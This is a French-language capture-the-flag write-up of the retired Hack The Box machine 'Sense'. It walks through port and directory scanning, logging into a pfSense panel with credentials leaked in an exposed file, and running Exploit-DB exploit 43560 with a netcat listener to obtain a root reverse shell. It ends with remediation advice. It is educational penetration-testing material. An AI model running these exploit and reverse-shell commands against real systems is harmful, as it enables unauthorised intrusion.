---
title: Restez calme et pirater la boîte - Sense
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-11-05T16:31:00.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-sense
coverImage: https://www.freecodecamp.org/news/content/images/2020/11/702551-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: information security
  slug: information-security
- name: Linux
  slug: linux
- name: Security
  slug: security
seo_title: Restez calme et pirater la boîte - Sense
seo_desc: 'Hack The Box (HTB) is an online platform that allows you to test your penetration
  testing skills.

  It contains several challenges that are constantly updated. Some of them simulate
  real world scenarios and some of them lean more towards a CTF style of...'
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion.

Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note** : _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-08-at-21.26.08.png)

Sense est assez simple dans l'ensemble. Il démontre les risques des mauvaises pratiques de mot de passe ainsi que l'exposition de fichiers internes sur un système public.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [Kali Linux box](https://www.kali.org/) :

* nmap
* dirbuster
* searchsploit

Commençons !

## **Étape 1 - Reconnaissance**

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

### **Scan de ports**

J'utiliserai **Nmap** (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité.

Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.05.48.png)

J'utilise la commande suivante pour effectuer un scan intensif :

```bash
nmap -A -v 10.10.10.60
```

**-A** : Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v** : Augmente le niveau de verbosité

**sense**.htb : nom d'hôte pour la boîte Sense

Si vous trouvez les résultats un peu trop écrasants, vous pouvez essayer ceci :

```bash
nmap 10.10.10.60
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.04.31.png)

Nous pouvons voir qu'il y a 2 ports ouverts incluant :

**Port** 80, le plus souvent utilisé par le protocole de transfert hypertexte (HTTP)

**Port** 443, port standard pour tout le trafic HTTP sécurisé

###
Scan de répertoires

Toujours dans la phase de scanning et de reconnaissance, j'utilise maintenant **DirBuster**. DirBuster est une application Java multithread conçue pour forcer brutalement les répertoires et les noms de fichiers sur les serveurs web/applications.

Vous pouvez lancer DirBuster en tapant cette commande sur le terminal :

```bash
dirbuster
```

ou en recherchant l'application :

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-02-at-21.01.31-1.png)
_Ancien Kali_

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.09.39.png)
_Nouveau Kali_

L'application ressemble à ceci, où vous pouvez spécifier l'URL cible. Dans notre cas, ce sera **https://10.10.10.60**. Vous pouvez sélectionner une liste de mots avec la liste des **dirs/fichiers** en cliquant sur le bouton Parcourir :

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.10.33.png)

J'utilise le **directory-list-2.3-medium.txt** pour cette recherche. Nous pouvons voir quelques fichiers intéressants ici :

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.11.18.png)

## **Étape 2 - Visite des fichiers obtenus lors de la phase de reconnaissance**

Naviguons vers le fichier **changelog.txt**. Nous obtenons plus d'informations sur un journal des modifications de sécurité, y compris la correction des vulnérabilités et la chronologie.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.12.44.png)

Un autre fichier intéressant est **system-users.txt** qui contient un nom d'utilisateur et une indication pour le mot de passe.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.13.16.png)

## **Étape 3 - Visite de la page web**

Naviguons vers le site web. Nous voyons un panneau pfSense.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.18.08.png)

> **pfSense** est une distribution logicielle open source de pare-feu/routeur basée sur FreeBSD. Il est installé sur un ordinateur physique ou une machine virtuelle pour faire un pare-feu/routeur dédié pour un réseau. Il peut être configuré et mis à niveau via une interface basée sur le web, et ne nécessite aucune connaissance du système FreeBSD sous-jacent pour gérer - Wikipedia

![Image](https://www.freecodecamp.org/news/content/images/2020/11/Screenshot-2020-11-03-at-21.24.44.png)
_https://www.pfsense.org/_

Faisons une recherche Google pour voir si nous pouvons trouver le nom d'utilisateur et le mot de passe par défaut pour pfSense. Bingo ! Nous trouvons une documentation sur Netgate Docs.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.19.03.png)
_https://docs.netgate.com/pfsense/en/latest/solutions/m1n1wall/getting-started.html_

J'essaie le nom d'utilisateur **Rohit** et le mot de passe **pfsense** sur la page de connexion et je suis connecté ! Je regarde le tableau de bord et d'autres informations que je pourrais recueillir. Nous pouvons voir quelle version spécifique nous utilisons - **2.1.3-RELEASE (amd64)**.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.19.37.png)

## **Étape 4 - Recherche d'un exploit**

J'utilise **Searchsploit** pour vérifier s'il existe un exploit connu. Searchsploit est un outil de recherche en ligne de commande pour [Exploit Database](https://www.exploit-db.com/).

J'utilise la commande suivante :

```bash
searchsploit pfsense
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.21.06.png)

J'obtiens plus de détails sur un exploit avec :

```bash
searchsploit -x 43560.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.23.18.png)

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.22.51.png)

Vous pouvez également consulter la **Exploit Database** pour trouver le même exploit.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.20.33.png)
_https://www.exploit-db.com/exploits/43560_

J'obtiens plus d'informations avec :

```bash
searchsploit -p 43560.py
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.23.55.png)

Je peux voir où il se trouve sur ma boîte Kali. Je copie le fichier dans mon dossier **Sense** avec :

```bash
cp /usr/share/exploitdb/exploits/linux/remote/43560.py .
```

et pour vérifier s'il a été copié dans ce dossier :

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.24.23.png)

Sur un terminal (côté droit), je configure un écouteur avec :

```bash
nv -nvlp 1234
```

Je configure ensuite l'exploit (côté gauche) avec :

```bash
python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.13 --lport 1234 --username rohit --password pfsense
```

J'ai obtenu un shell en tant que root !

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.24.51.png)

Je commence à recueillir quelques informations de base. **id** retourne l'ID utilisateur réel du processus appelant.

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.25.41.png)

## **Étape 5 - Recherche du flag user.txt**

Je navigue vers le dossier **rohit** depuis **home**.

Je peux lister tous les fichiers/dossiers avec la commande suivante :

```bash
ls -la
```

Je me déplace ensuite vers le dossier **home** avec :

```bash
cd home
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.26.25.png)

Et je trouve le flag utilisateur ! Je vérifie le contenu du fichier avec :

```bash
cat user.txt
```

## **Étape 5 - Recherche du flag root.txt**

Trouvons maintenant le flag root. Je navigue jusqu'à **root**.

Je trouve le fichier root.txt et vérifie son contenu avec :

```bash
cat root.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/09/Screenshot-2020-09-15-at-21.27.01.png)

Félicitations ! Vous avez trouvé les deux flags.

## **Remédiations**

* Ne stockez pas d'informations sensibles telles que les identifiants de connexion ou votre statut de correctif dans un fichier en texte brut sur le serveur web
* L'application pfsense doit être corrigée à la dernière version
* Assurez-vous de changer le mot de passe par défaut lorsque vous configurez de nouvelles applications/serveurs/plateformes
* Appliquez le [principe du moindre privilège](https://en.wikipedia.org/wiki/Principle_of_least_privilege) à tous vos systèmes et services

N'hésitez pas à poser des questions ou à partager avec vos amis :)

Vous pouvez voir plus d'articles de la série **Restez calme et pirater la boîte** [ici](https://www.freecodecamp.org/news/search/?query=keep%20calm%20and%20hack%20the%20box).

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/).

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

![Image](https://www.freecodecamp.org/news/content/images/2020/11/702551.jpg)